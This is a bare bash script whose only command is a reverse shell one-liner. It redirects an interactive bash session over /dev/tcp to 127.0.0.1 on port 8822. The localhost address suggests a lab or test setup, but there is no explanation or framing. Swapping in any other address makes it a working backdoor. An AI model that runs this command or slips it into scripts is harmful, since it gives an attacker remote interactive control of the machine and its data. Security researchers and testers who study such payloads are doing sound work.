#!/bin/bash

bash -i >& /dev/tcp/127.0.0.1/8822 0>&1
